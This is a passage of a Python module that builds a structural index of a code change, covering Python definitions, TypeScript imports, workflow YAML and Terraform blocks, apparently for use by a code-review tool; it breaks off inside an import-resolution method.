"""A structural reference of the code a change touches, built by the host before any model runs.

The deep pass's map found names with regular expressions and looked them up with `git grep`: a hit was any line
holding the word, a "definition" any line that looked like one. This module reads the files themselves:

- Python through `ast`: definitions with their line ranges and signatures, imports resolved to files of the
  repository, call sites resolved to the definitions they reach, class hierarchies (overrides), test functions and
  what they call, and literal families (lists, tuples and sets of strings);
- TypeScript and JavaScript through a structural scanner: definitions, imports and exports resolved to files,
  call sites, literal arrays of strings;
- GitHub Actions workflows through a small YAML reader, and Terraform through a block scanner, enough to state
  facts about permissions, triggers, guards, interpolations and resource references.

Only what the change can reach is indexed, bounded in files and bytes: the changed files, the files that import
them, the modules they import, and the test files that name the changed symbols. The repository stays data
(RLM): the model gets a bounded view with ids (`block()`), exact lookups the host serves on request (`symbol`,
`callers`, `callees`, `tests_of`), and host-observed facts (`facts()`, `structural_findings()`): a literal family
the change edits in one file is also listed, unchanged, in others; a new workflow grants a permission nothing
uses; a removed Terraform resource is still referenced. Facts never post themselves: a structural finding goes
through the verifier like any other, with citations the host checked.

Dependency-free, standard library only. Every reader is defensive: a file that does not parse is skipped, and a
reader that fails leaves the others' results standing.
"""
from __future__ import annotations

import ast
import posixpath
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Iterable

#: Bounds of the index: files read, bytes parsed, call sites and families kept.
MAX_FILES = 80
MAX_BYTES = 3_000_000
MAX_IMPORTERS = 30
MAX_TEST_FILES = 20
MAX_CALLS_PER_FILE = 2_000
MAX_FAMILIES_PER_FILE = 60
#: Bounds of what is shown.
BLOCK_CHARS = 12_000
MAX_CALLERS_SHOWN = 8
MAX_TESTS_SHOWN = 5
MAX_BODY_LINES = 60
#: A literal family is indexed from two members; drift is reported from three (pairs are too common to be registries).
MIN_FAMILY_ITEMS = 2
MIN_FAMILY_REPORTED = 3
MAX_LINE_CHARS = 160

_PY = re.compile(r"\.py$")
_TS = re.compile(r"\.(ts|tsx|js|jsx|mjs|cjs|mts|cts)$")
_WORKFLOW = re.compile(r"(^|/)\.github/workflows/[^/]+\.ya?ml$")
_TF = re.compile(r"\.tf$")
_TEST_PATH = re.compile(r"(^|/)(tests?|__tests__|spec|specs)/|[._-](test|spec)\.[^/]+$|(^|/)test_[^/]+\.py$", re.I)
_IDENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")


def _clip(text: str, limit: int = MAX_LINE_CHARS) -> str:
    text = text.strip()
    return text if len(text) <= limit else text[: limit - 1] + "…"


# --- Data ------------------------------------------------------------------------------------------------------


@dataclass
class Symbol:
    path: str
    name: str
    qualname: str
    kind: str  # function | method | class | constant | variable | interface | type | enum
    line: int
    end: int
    signature: str = ""
    parent: str | None = None
    bases: list[str] = field(default_factory=list)
    decorators: list[str] = field(default_factory=list)
    doc: str = ""
    exported: bool = True

    @property
    def key(self) -> str:
        return f"{self.path}::{self.qualname}"


@dataclass
class CallSite:
    path: str
    line: int
    callee: str
    text: str
    enclosing: str | None
    #: Keys of the definitions the call resolves to (empty: unresolved, matched by name only).
    targets: list[str] = field(default_factory=list)


@dataclass
class Family:
    """A literal list, tuple, set or array of strings: the registries and member lists changes drift on."""
    path: str
    line: int
    name: str | None
    items: tuple[str, ...]
    enclosing: str | None = None


@dataclass
class FileIndex:
    path: str
    lang: str
    symbols: list[Symbol] = field(default_factory=list)
    #: Local name -> (module path in the repository or None, imported name or "*" for a module).
    imports: dict[str, tuple[str | None, str]] = field(default_factory=dict)
    calls: list[CallSite] = field(default_factory=list)
    families: list[Family] = field(default_factory=list)
    #: Names the file exports (TS/JS), or every top-level name (Python).
    exports: set[str] = field(default_factory=set)
    parsed: bool = True


# --- Python ----------------------------------------------------------------------------------------------------


def _py_signature(node: ast.AST) -> str:
    if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
        prefix = "async def" if isinstance(node, ast.AsyncFunctionDef) else "def"
        args = ast.unparse(node.args)
        returns = f" -> {ast.unparse(node.returns)}" if node.returns is not None else ""
        return f"{prefix} {node.name}({args}){returns}"
    if isinstance(node, ast.ClassDef):
        bases = ", ".join(ast.unparse(base) for base in node.bases)
        return f"class {node.name}({bases})" if bases else f"class {node.name}"
    return ""


def _py_name(node: ast.AST) -> str | None:
    """The dotted text of a call's callee, or None when it is not a plain name or attribute chain."""
    if isinstance(node, ast.Name):
        return node.id
    if isinstance(node, ast.Attribute):
        base = _py_name(node.value)
        return f"{base}.{node.attr}" if base else None
    return None


def _py_family(node: ast.AST) -> tuple[str, ...] | None:
    if isinstance(node, (ast.List, ast.Tuple, ast.Set)):
        items = []
        for element in node.elts:
            if isinstance(element, ast.Constant) and isinstance(element.value, str):
                items.append(element.value)
            else:
                return None
        return tuple(items) if len(items) >= MIN_FAMILY_ITEMS else None
    if isinstance(node, ast.Dict) and node.keys:
        items = []
        for key in node.keys:
            if isinstance(key, ast.Constant) and isinstance(key.value, str):
                items.append(key.value)
            else:
                return None
        return tuple(items) if len(items) >= MIN_FAMILY_ITEMS else None
    return None


class _PyVisitor(ast.NodeVisitor):
    def __init__(self, index: FileIndex, lines: list[str]) -> None:
        self.index = index
        self.lines = lines
        self.stack: list[ast.AST] = []

    def _qual(self, name: str) -> str:
        parts = [node.name for node in self.stack if isinstance(node, (ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef))]
        return ".".join([*parts, name])

    def _enclosing(self) -> str | None:
        parts = [node.name for node in self.stack if isinstance(node, (ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef))]
        return ".".join(parts) or None

    def _parent_class(self) -> str | None:
        for node in reversed(self.stack):
            if isinstance(node, ast.ClassDef):
                return node.name
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                return None
        return None

    def visit_Import(self, node: ast.Import) -> None:
        for alias in node.names:
            local = alias.asname or alias.name.split(".")[0]
            self.index.imports[local] = (None, alias.name)  # resolved later
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
        module = "." * (node.level or 0) + (node.module or "")
        for alias in node.names:
            local = alias.asname or alias.name
            self.index.imports[local] = (None, f"{module}:{alias.name}")
        self.generic_visit(node)

    def _add_def(self, node: ast.AST, kind: str) -> None:
        name = getattr(node, "name", "")
        parent = self._parent_class()
        symbol = Symbol(self.index.path, name, self._qual(name), "method" if kind == "function" and parent else kind,
                        node.lineno, getattr(node, "end_lineno", node.lineno) or node.lineno, _py_signature(node), parent,
                        [ast.unparse(base) for base in getattr(node, "bases", [])],
                        [ast.unparse(item) for item in getattr(node, "decorator_list", [])][:4],
                        _clip((ast.get_docstring(node) or "").split("\n")[0], 120) if isinstance(
                            node, (ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef)) else "",
                        exported=not name.startswith("_"))
        self.index.symbols.append(symbol)
        if not self.stack:
            self.index.exports.add(name)

    def visit_FunctionDef(self, node: ast.FunctionDef) -> None:
        self._add_def(node, "function")
        self.stack.append(node)
        self.generic_visit(node)
        self.stack.pop()

    def visit_AsyncFunctionDef(self, node: ast.AsyncFunctionDef) -> None:
        self._add_def(node, "function")
        self.stack.append(node)
        self.generic_visit(node)
        self.stack.pop()

    def visit_ClassDef(self, node: ast.ClassDef) -> None:
        self._add_def(node, "class")
        self.stack.append(node)
        self.generic_visit(node)
        self.stack.pop()

    def _assign(self, targets: list[ast.AST], value: ast.AST | None, node: ast.AST) -> None:
        names = [target.id for target in targets if isinstance(target, ast.Name)]
        family = _py_family(value) if value is not None else None
        if family is not None and len(self.index.families) < MAX_FAMILIES_PER_FILE:
            self.index.families.append(Family(self.index.path, node.lineno, names[0] if names else None, family,
                                              self._enclosing()))
        if not self.stack or isinstance(self.stack[-1], ast.ClassDef):
            for name in names:
                kind = "constant" if name.isupper() else "variable"
                parent = self._parent_class()
                self.index.symbols.append(Symbol(self.index.path, name, self._qual(name), kind, node.lineno,
                                                 getattr(node, "end_lineno", node.lineno) or node.lineno,
                                                 _clip(self.lines[node.lineno - 1], 120) if node.lineno <= len(self.lines) else "",
                                                 parent, exported=not name.startswith("_")))
                if not self.stack:
                    self.index.exports.add(name)

    def visit_Assign(self, node: ast.Assign) -> None:
        self._assign(node.targets, node.value, node)
        self.generic_visit(node)

    def visit_AnnAssign(self, node: ast.AnnAssign) -> None:
        self._assign([node.target], node.value, node)
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call) -> None:
        callee = _py_name(node.func)
        if callee and len(self.index.calls) < MAX_CALLS_PER_FILE:
            text = self.lines[node.lineno - 1] if node.lineno <= len(self.lines) else ""
            self.index.calls.append(CallSite(self.index.path, node.lineno, callee, _clip(text), self._enclosing()))
        self.generic_visit(node)

    def generic_visit(self, node: ast.AST) -> None:
        # Families that are not assigned (a parametrize list, a call argument) still count.
        if isinstance(node, (ast.List, ast.Tuple, ast.Set)) and not isinstance(getattr(node, "ctx", None), ast.Store):
            family = _py_family(node)
            if family is not None and len(self.index.families) < MAX_FAMILIES_PER_FILE and not any(
                    item.line == node.lineno and item.items == family for item in self.index.families):
                self.index.families.append(Family(self.index.path, node.lineno, None, family, self._enclosing()))
        super().generic_visit(node)


def index_python(path: str, text: str) -> FileIndex:
    index = FileIndex(path, "python")
    try:
        tree = ast.parse(text)
    except (SyntaxError, ValueError, RecursionError):
        index.parsed = False
        return index
    try:
        _PyVisitor(index, text.splitlines()).visit(tree)
    except RecursionError:
        index.parsed = False
    return index


# --- TypeScript and JavaScript ---------------------------------------------------------------------------------


_TS_FUNC = re.compile(r"^\s*(?:export\s+)?(?:default\s+)?(?:async\s+)?function\s*\*?\s*([A-Za-z_$][\w$]*)\s*[<(]")
_TS_ARROW = re.compile(r"^\s*(?:export\s+)?(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*(?::[^=]+)?=\s*(?:async\s*)?(?:\([^)]*\)|[A-Za-z_$][\w$]*)\s*(?::\s*[^=]+)?=>")
_TS_CLASS = re.compile(r"^\s*(?:export\s+)?(?:default\s+)?(?:abstract\s+)?class\s+([A-Za-z_$][\w$]*)(?:\s+extends\s+([\w$.]+))?")
_TS_TYPE = re.compile(r"^\s*(?:export\s+)?(?:declare\s+)?(interface|type|enum)\s+([A-Za-z_$][\w$]*)")
_TS_CONST = re.compile(r"^\s*(?:export\s+)?(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*(?::[^=]+)?=")
_TS_METHOD = re.compile(r"^\s+(?:(?:public|private|protected|static|async|readonly|override|get|set)\s+)*([A-Za-z_$][\w$]*)\s*(?:<[^>]*>)?\([^)]*\)\s*(?::\s*[^{;=]+)?\{")
_TS_IMPORT = re.compile(r"""import\s+(?:type\s+)?(?:([A-Za-z_$][\w$]*)\s*,?\s*)?(?:\{([^}]*)\})?\s*(?:\*\s+as\s+([A-Za-z_$][\w$]*))?\s*from\s*['"]([^'"]+)['"]""")
_TS_REQUIRE = re.compile(r"""(?:const|let|var)\s+(?:\{([^}]*)\}|([A-Za-z_$][\w$]*))\s*=\s*require\(\s*['"]([^'"]+)['"]\s*\)""")
_TS_EXPORT = re.compile(r"^\s*export\s+\{([^}]*)\}")
_TS_ARRAY = re.compile(r"\[\s*((?:['\"`][^'\"`\n]*['\"`]\s*,\s*){1,}['\"`][^'\"`\n]*['\"`]\s*,?\s*)\]", re.S)
_TS_KEYWORDS = {"if", "for", "while", "switch", "catch", "function", "return", "new", "typeof", "await", "else", "do", "try"}


def _ts_block_end(lines: list[str], start: int) -> int:
    """The line where the block opened on `start` (1-based) closes, by brace count (strings and comments are
    skipped roughly); `start` when no brace opens there."""
    depth = 0
    opened = False
    for number in range(start, len(lines) + 1):
        line = re.sub(r"//.*$|'(?:\\.|[^'\\])*'|\"(?:\\.|[^\"\\])*\"|`(?:\\.|[^`\\])*`", "", lines[number - 1])
        for char in line:
            if char == "{":
                depth += 1
                opened = True
            elif char == "}":
                depth -= 1
                if opened and depth <= 0:
                    return number
        if not opened and number > start:
            return start
    return len(lines)


def index_ts(path: str, text: str) -> FileIndex:
    index = FileIndex(path, "ts")
    lines = text.splitlines()
    class_stack: list[tuple[str, int]] = []  # (name, end line)
    for number, line in enumerate(lines, 1):
        while class_stack and number > class_stack[-1][1]:
            class_stack.pop()
        exported = line.lstrip().startswith("export")
        match = _TS_CLASS.match(line)
        if match:
            end = _ts_block_end(lines, number)
            index.symbols.append(Symbol(path, match.group(1), match.group(1), "class", number, end, _clip(line, 120),
                                        None, [match.group(2)] if match.group(2) else [], exported=exported))
            class_stack.append((match.group(1), end))
            if exported:
                index.exports.add(match.group(1))
            continue
        match = _TS_FUNC.match(line) or _TS_ARROW.match(line)
        if match:
            name = match.group(1)
            end = _ts_block_end(lines, number)
            parent = class_stack[-1][0] if class_stack else None
            index.symbols.append(Symbol(path, name, f"{parent}.{name}" if parent else name, "method" if parent else "function",
                                        number, end, _clip(line, 120), parent, exported=exported))
            if exported:
                index.exports.add(name)
            continue
        match = _TS_TYPE.match(line)
        if match:
            end = _ts_block_end(lines, number)
            index.symbols.append(Symbol(path, match.group(2), match.group(2), match.group(1), number, end, _clip(line, 120),
                                        exported=exported))
            if exported:
                index.exports.add(match.group(2))
            continue
        if class_stack:
            match = _TS_METHOD.match(line)
            if match and match.group(1) not in _TS_KEYWORDS:
                parent = class_stack[-1][0]
                index.symbols.append(Symbol(path, match.group(1), f"{parent}.{match.group(1)}", "method", number,
                                            _ts_block_end(lines, number), _clip(line, 120), parent))
                continue
        match = _TS_CONST.match(line)
        if match:
            index.symbols.append(Symbol(path, match.group(1), match.group(1), "constant" if match.group(1).isupper() else "variable",
                                        number, number, _clip(line, 120), exported=exported))
            if exported:
                index.exports.add(match.group(1))
    for match in _TS_IMPORT.finditer(text):
        default, names, star, spec = match.groups()
        if default:
            index.imports[default] = (None, f"{spec}:default")
        if star:
            index.imports[star] = (None, f"{spec}:*")
        for part in (names or "").split(","):
            part = part.strip().removeprefix("type ").strip()
            if not part:
                continue
            original, _, alias = part.partition(" as ")
            index.imports[(alias or original).strip()] = (None, f"{spec}:{original.strip()}")
    for match in _TS_REQUIRE.finditer(text):
        names, single, spec = match.groups()
        if single:
            index.imports[single] = (None, f"{spec}:*")
        for part in (names or "").split(","):
            part = part.strip()
            if part:
                original, _, alias = part.partition(":")
                index.imports[(alias or original).strip()] = (None, f"{spec}:{original.strip()}")
    for match in _TS_EXPORT.finditer(text):
        for part in match.group(1).split(","):
            name = part.strip().split(" as ")[-1].strip()
            if name:
                index.exports.add(name)
    # Call sites of names the index may know: every `name(` not preceded by a word character or a dot that would
    # make it another object's method (those are kept with the dot, as `obj.name`).
    enclosing: list[tuple[Symbol, int]] = []
    for number, line in enumerate(lines, 1):
        for symbol in index.symbols:
            if symbol.line == number and symbol.kind in ("function", "method", "class"):
                enclosing.append((symbol, symbol.end))
        enclosing = [(symbol, end) for symbol, end in enclosing if number <= end]
        stripped = re.sub(r"//.*$", "", line)
        for match in re.finditer(r"(?<![\w$])((?:[A-Za-z_$][\w$]*\.)*[A-Za-z_$][\w$]*)\s*\(", stripped):
            callee = match.group(1)
            leaf = callee.rsplit(".", 1)[-1]
            if leaf in _TS_KEYWORDS or len(index.calls) >= MAX_CALLS_PER_FILE:
                continue
            inner = enclosing[-1][0] if enclosing else None
            if inner is not None and inner.line == number:
                continue  # the definition line itself
            index.calls.append(CallSite(path, number, callee, _clip(line), inner.qualname if inner else None))
    for match in _TS_ARRAY.finditer(text):
        items = tuple(item.strip()[1:-1] for item in re.findall(r"""['"`][^'"`\n]*['"`]""", match.group(1)))
        if len(items) >= MIN_FAMILY_ITEMS and len(index.families) < MAX_FAMILIES_PER_FILE:
            number = text.count("\n", 0, match.start()) + 1
            before = text[max(0, match.start() - 120):match.start()]
            named = re.search(r"([A-Za-z_$][\w$]*)\s*(?::[^=]+)?=\s*$", before)
            index.families.append(Family(path, number, named.group(1) if named else None, items))
    return index


# --- YAML (a subset: what workflows and manifests use) ---------------------------------------------------------


class YamlNode:
    """A mapping or sequence read from YAML, with the line of each entry."""

    __slots__ = ("value", "line", "lines")

    def __init__(self, value: Any, line: int) -> None:
        self.value = value
        self.line = line
        #: For a mapping: key -> line; for a sequence: index -> line.
        self.lines: dict[Any, int] = {}


def _yaml_scalar(text: str) -> Any:
    text = text.strip()
    if text == "" or text in ("~", "null", "Null", "NULL"):
        return None
    if len(text) >= 2 and text[0] == text[-1] and text[0] in "'\"":
        inner = text[1:-1]
        return inner.replace("''", "'") if text[0] == "'" else re.sub(r"\\(.)", r"\1", inner)
    if text.startswith("[") and text.endswith("]"):
        inner = text[1:-1].strip()
        return [] if not inner else [_yaml_scalar(part) for part in _split_flow(inner)]
    if text.startswith("{") and text.endswith("}"):
        out: dict[str, Any] = {}
        for part in _split_flow(text[1:-1]):
            key, _, value = part.partition(":")
            if key.strip():
                out[_yaml_scalar(key)] = _yaml_scalar(value)
        return out
    return text


def _split_flow(text: str) -> list[str]:
    """The top-level comma-separated parts of a flow collection's inside (nested brackets and quotes kept)."""
    parts: list[str] = []
    depth = 0
    quote: str | None = None
    current = ""
    for char in text:
        if quote:
            if char == quote:
                quote = None
        elif char in "'\"":
            quote = char
        elif char in "[{":
            depth += 1
        elif char in "]}":
            depth -= 1
        elif char == "," and depth == 0:
            parts.append(current)
            current = ""
            continue
        current += char
    if current.strip():
        parts.append(current)
    return parts


def _strip_comment(line: str) -> str:
    out = []
    quote = None
    for index, char in enumerate(line):
        if quote:
            if char == quote:
                quote = None
        elif char in "'\"":
            quote = char
        elif char == "#" and (index == 0 or line[index - 1] in " \t"):
            break
        out.append(char)
    return "".join(out).rstrip()


def parse_yaml(text: str) -> YamlNode | None:
    """Block mappings and sequences, scalars, flow lists and maps on one line, block scalars (`|`, `>`),
    comments and a document marker: what a workflow or a manifest uses. Anchors, tags and multi-document files
    are not supported (the first document is read, anchors are kept as text). Returns None for an empty file."""
    raw = text.splitlines()
    lines: list[tuple[int, int, str]] = []  # (number, indent, content)
    for number, line in enumerate(raw, 1):
        if line.strip() in ("---", "...") and lines:
            break
        if line.strip() == "---":
            continue
        content = _strip_comment(line.expandtabs(2))
        if not content.strip():
            continue
        lines.append((number, len(content) - len(content.lstrip(" ")), content.strip()))
    if not lines:
        return None
    position = 0

    def block_scalar(indent: int, marker: str) -> str:
        nonlocal position
        parts = []
        while position < len(lines) and lines[position][1] > indent:
            parts.append(raw[lines[position][0] - 1].strip())
            position += 1
        return ("\n" if marker.startswith("|") else " ").join(parts)

    def parse_block(indent: int) -> YamlNode:
        nonlocal position
        number, _indent, content = lines[position]
        if content.startswith("- ") or content == "-":
            node = YamlNode([], number)
            while position < len(lines) and lines[position][1] == indent and (lines[position][2].startswith("- ") or lines[position][2] == "-"):
                item_number, _i, item = lines[position]
                rest = item[1:].strip()
                index = len(node.value)
                node.lines[index] = item_number
                if not rest:
                    position += 1
                    node.value.append(parse_block(lines[position][1]).value if position < len(lines) and lines[position][1] > indent else None)
                    continue
                key_match = re.match(r"^([^\s:'\"]+|'[^']*'|\"[^\"]*\")\s*:(?:\s|$)(.*)$", rest)
                if key_match and not rest.startswith(("[", "{")):
                    # A mapping that starts on the dash line: its keys are indented past the dash.
                    lines[position] = (item_number, indent + 2, rest)
                    node.value.append(parse_block(indent + 2).value)
                    continue
                node.value.append(_yaml_scalar(rest))
                position += 1
            return node
        node = YamlNode({}, number)
        while position < len(lines) and lines[position][1] == indent:
            key_number, _i, content = lines[position]
            match = re.match(r"^([^\s:'\"]+|'[^']*'|\"[^\"]*\")\s*:(?:\s+|$)(.*)$", content)
            if not match:
                position += 1
                continue
            key = _yaml_scalar(match.group(1))
            rest = match.group(2).strip()
            node.lines[key] = key_number
            position += 1
            if rest in ("|", ">", "|-", ">-", "|+", ">+"):
                node.value[key] = block_scalar(indent, rest)
            elif rest == "":
                if position < len(lines) and lines[position][1] > indent:
                    node.value[key] = parse_block(lines[position][1]).value
                elif position < len(lines) and lines[position][1] == indent and lines[position][2].startswith("- "):
                    node.value[key] = parse_block(indent).value  # a sequence at the key's own indent
                else:
                    node.value[key] = None
            else:
                node.value[key] = _yaml_scalar(rest)
        return node

    try:
        root = parse_block(lines[0][1])
    except (IndexError, RecursionError):
        return None
    return root


def _yaml_get(value: Any, *keys: Any) -> Any:
    for key in keys:
        if isinstance(value, dict):
            value = value.get(key)
        elif isinstance(value, list) and isinstance(key, int) and key < len(value):
            value = value[key]
        else:
            return None
    return value


# --- Terraform -------------------------------------------------------------------------------------------------


_TF_BLOCK = re.compile(r"""^\s*(resource|data|module|variable|output|locals|provider|terraform)(?:\s+"([^"]+)")?(?:\s+"([^"]+)")?\s*\{""")
_TF_NESTED = re.compile(r"^\s*([a-z_]+)\s*\{")
_TF_ATTR = re.compile(r"^\s*([a-z_][a-z0-9_]*)\s*=\s*(.*)$")
_TF_REF = re.compile(r"\b(var|local|module|data)\.([A-Za-z_][\w-]*)|\b([a-z][a-z0-9_]*_[a-z0-9_]+)\.([A-Za-z_][\w-]*)\b")


@dataclass
class TfBlock:
    kind: str  # resource | data | module | variable | output | locals | provider | terraform
    type: str
    name: str
    path: str
    line: int
    end: int
    attrs: dict[str, str] = field(default_factory=dict)
    nested: dict[str, dict[str, str]] = field(default_factory=dict)
    refs: set[str] = field(default_factory=set)

    @property
    def address(self) -> str:
        if self.kind == "resource":
            return f"{self.type}.{self.name}"
        if self.kind == "data":
            return f"data.{self.type}.{self.name}"
        return f"{self.kind}.{self.type}" if self.type else self.kind


def parse_terraform(path: str, text: str) -> list[TfBlock]:
    blocks: list[TfBlock] = []
    lines = text.splitlines()
    current: TfBlock | None = None
    depth = 0
    nested_name: str | None = None
    heredoc: str | None = None
    for number, line in enumerate(lines, 1):
        if heredoc is not None:
            if line.strip() == heredoc:
                heredoc = None
            continue
        stripped = re.sub(r"(#|//).*$", "", line)
        if current is None:
            match = _TF_BLOCK.match(stripped)
            if match:
                kind, first, second = match.groups()
                if kind in ("resource", "data"):
                    current = TfBlock(kind, first or "", second or "", path, number, number)
                else:
                    current = TfBlock(kind, first or "", "", path, number, number)
                depth = 1
                nested_name = None
            continue
        opened = stripped.count("{")
        closed = stripped.count("}")
        doc = re.search(r"<<-?\s*([A-Z_]+)\s*$", stripped)
        if doc:
            heredoc = doc.group(1)
        # A heredoc attribute (a policy document) is skipped with its body: its lines are not the block's wiring.
        attr = None if doc else _TF_ATTR.match(stripped)
        if attr and depth == 1 and not stripped.rstrip().endswith("{"):
            current.attrs[attr.group(1)] = _clip(attr.group(2), 200)
        elif attr and depth == 2 and nested_name is not None and not stripped.rstrip().endswith("{"):
            current.nested.setdefault(nested_name, {})[attr.group(1)] = _clip(attr.group(2), 200)
        nested = _TF_NESTED.match(stripped)
        if nested and depth == 1 and stripped.rstrip().endswith("{"):
            nested_name = nested.group(1)
        for match in _TF_REF.finditer(stripped):
            if match.group(1):
                current.refs.add(f"{match.group(1)}.{match.group(2)}")
            elif match.group(3):
                current.refs.add(f"{match.group(3)}.{match.group(4)}")
        depth += opened - closed
        if depth <= 0:
            current.end = number
            blocks.append(current)
            current = None
    if current is not None:
        current.end = len(lines)
        blocks.append(current)
    return blocks


# --- The reference ---------------------------------------------------------------------------------------------


_IMPORT_LINE = re.compile(r"^\s*(?:from\s+([\w.]+)\s+import|import\s+([\w.]+))|require\(\s*['\"]([^'\"]+)['\"]\s*\)|from\s+['\"]([^'\"]+)['\"]")


class Reference:
    """The index and its views. `build` reads what the change can reach; the queries never touch the repository
    again except through the `Repo` passed in (`git grep`/`git show` on the reviewed commit)."""

    def __init__(self, repo: Any, files: list[Any], *, base_repo: Any = None, clock: Callable[[], float] = time.monotonic,
                 max_files: int = MAX_FILES, max_bytes: int = MAX_BYTES) -> None:
        self.repo = repo
        self.base_repo = base_repo
        self.files = [item for item in files if not getattr(item, "binary", False)]
        self.clock = clock
        self.max_files = max_files
        self.max_bytes = max_bytes
        self.index: dict[str, FileIndex] = {}
        self.workflows: dict[str, YamlNode] = {}
        self.terraform: dict[str, list[TfBlock]] = {}
        self.changed_lines: dict[str, set[int]] = {}
        self.removed_text: dict[str, list[str]] = {}
        self.base_index: dict[str, FileIndex] = {}
        self.stats: dict[str, Any] = {"files": 0, "bytes": 0, "symbols": 0, "calls": 0, "families": 0, "workflows": 0,
                                      "terraform": 0, "ms": 0, "skipped": 0}
        self._modules: dict[str, str] = {}
        self._ids: dict[str, str] = {}
        self._facts: list[dict[str, Any]] | None = None

    # -- building

    def build(self) -> "Reference":
        began = self.clock()
        tracked = set(self.repo.files())
        changed = [item.path for item in self.files if item.path in tracked]
        for item in self.files:
            self.changed_lines[item.path] = {line.new for hunk in item.hunks for line in hunk.lines if line.kind == "+" and line.new}
            self.removed_text[item.path] = [line.text for hunk in item.hunks for line in hunk.lines if line.kind == "-"]
        self._modules = _module_map(tracked)
        wanted: list[str] = list(changed)
        wanted += self._importers(changed, tracked)
        for path in changed:
            self._read(path)
        for path in list(wanted):
            if path in self.index:
                for module_path in self._imported_paths(self.index[path]):
                    if module_path not in wanted:
                        wanted.append(module_path)
        wanted += self._test_files(changed, tracked)
        # Terraform references cross files of one directory: the siblings of a changed .tf file are read too.
        for path in list(self.changed_lines):
            if _TF.search(path):
                directory = posixpath.dirname(path)
                wanted += [other for other in sorted(tracked) if _TF.search(other) and posixpath.dirname(other) == directory and other not in wanted][:20]
        for path in wanted:
            if len(self.index) + len(self.workflows) + len(self.terraform) >= self.max_files or self.stats["bytes"] >= self.max_bytes:
                self.stats["skipped"] += 1
                continue
            self._read(path)
        # Imports resolve to paths once every file is read.
        for index in self.index.values():
            for local, (module_path, name) in list(index.imports.items()):
                if module_path is None:
                    index.imports[local] = (self._resolve_module(name, index.path), name.split(":")[-1])
        for index in self.index.values():
            self._resolve_calls(index)
        # The base versions of changed code files, for signature changes.
        if self.base_repo is not None:
            for path in changed:
                if _PY.search(path) or _TS.search(path):
                    lines = self.base_repo.lines(path)
                    if lines:
                        self.base_index[path] = (index_python if _PY.search(path) else index_ts)(path, "\n".join(lines))
        self.stats.update(files=len(self.index) + len(self.workflows) + len(self.terraform),
                          symbols=sum(len(index.symbols) for index in self.index.values()),
                          calls=sum(len(index.calls) for index in self.index.values()),
                          families=sum(len(index.families) for index in self.index.values()),
                          workflows=len(self.workflows), terraform=len(self.terraform),
                          ms=int((self.clock() - began) * 1000))
        setattr(self.repo, "reference", self)
        return self

    def _read(self, path: str) -> None:
        if path in self.index or path in self.workflows or path in self.terraform:
            return
        lines = self.repo.lines(path)
        if lines is None:
            return
        text = "\n".join(lines)
        self.stats["bytes"] += len(text)
        try:
            if _PY.search(path):
                self.index[path] = index_python(path, text)
            elif _TS.search(path):
                self.index[path] = index_ts(path, text)
            elif _WORKFLOW.search(path):
                node = parse_yaml(text)
                if node is not None and isinstance(node.value, dict):
                    self.workflows[path] = node
            elif _TF.search(path):
                self.terraform[path] = parse_terraform(path, text)
        except Exception:  # one unreadable file never costs the others
            self.stats["skipped"] += 1

    def _importers(self, changed: list[str], tracked: set[str]) -> list[str]:
        """Files that import a changed module, by a grep of its module name or relative path."""
        out: list[str] = []
        for path in changed:
            if not (_PY.search(path) or _TS.search(path)):
                continue
            stem = posixpath.splitext(posixpath.basename(path))[0]
            if stem in ("__init__", "index"):
                stem = posixpath.basename(posixpath.dirname(path))
            if not stem or not _IDENT.match(stem.replace("-", "_")):
                continue
            # `git grep -E` is POSIX: no \s, \w or \b.
            name = re.escape(stem)
            pattern = (rf"(from|import)[ \t]+[A-Za-z0-9_.]*{name}([^A-Za-z0-9_]|$)"
                       rf"|require\(['\"][^'\"]*{name}['\"]|from[ \t]+['\"][^'\"]*{name}(\.[a-z]+)?['\"]")
            try:
                hits = self.repo.grep(pattern, limit=MAX_IMPORTERS * 2)
            except Exception:
                continue
            for hit_path, _line, _text in hits:
                if hit_path != path and hit_path in tracked and (_PY.search(hit_path) or _TS.search(hit_path)) and hit_path not in out:
                    out.append(hit_path)
                if len(out) >= MAX_IMPORTERS:
                    break
        return out

    def _test_files(self, changed: list[str], tracked: set[str]) -> list[str]:
        names = [symbol.name for path in changed for symbol in self.index.get(path, FileIndex(path, "")).symbols
                 if symbol.kind in ("function", "method", "class") and symbol.exported][:12]
        if not names:
            return []
        pattern = "|".join(re.escape(name) for name in names)
        out: list[str] = []
        try:
            hits = self.repo.grep(rf"(^|[^A-Za-z0-9_])({pattern})([^A-Za-z0-9_]|$)", limit=200)
        except Exception:
            return []
        for hit_path, _line, _text in hits:
            if _TEST_PATH.search(hit_path) and hit_path in tracked and hit_path not in out and (_PY.search(hit_path) or _TS.search(hit_path)):
                out.append(hit_path)
            if len(out) >= MAX_TEST_FILES:
                break
        return out

    def _imported_paths(self, index: FileIndex) -> list[str]:
        out = []
        for _local, (module_path, name) in index.imports.items():
            resolved = module_path or self._resolve_module(name, index.path)
            if resolved and resolved not in out:
                out.append(resolved)
        return out

    def _resolve_module(self, spec: str, from_path: str) -> str | None:
        """The repository file a Python module (`pkg.mod`, `.rel:name`) or a TS specifier (`./x`) names."""
        if spec.startswith(("./", "../", "/")) or (self.index.get(from_path) and self.index[from_path].lang == "ts"):
            spec = spec.partition(":")[0]
            if not spec.startswith("."):
                return None
            base = posixpath.normpath(posixpath.join(posixpath.dirname(from_path), spec))
            for candidate in (base, f"{base}.ts", f"{base}.tsx", f"{base}.js", f"{base}.jsx", f"{base}.mjs", f"{base}/index.ts",
                              f"{base}/index.tsx", f"{base}/index.js"):
                if candidate in self._modules.values():
                    return candidate
            return None
        module, _, _name = spec.partition(":")
        if module.startswith("."):
            dots = len(module) - len(module.lstrip("."))
            directory = posixpath.dirname(from_path)
            for _ in range(dots - 1):
                directory = posixpath.dirname(directory)
            rest = module.lstrip(".")
            base = posixpath.join(directory, rest.replace(".", "/")) if rest else directory
            for candidate in (f"{base}.py", f"{base}/__init__.py"):
                if candidate in self._modules.values():
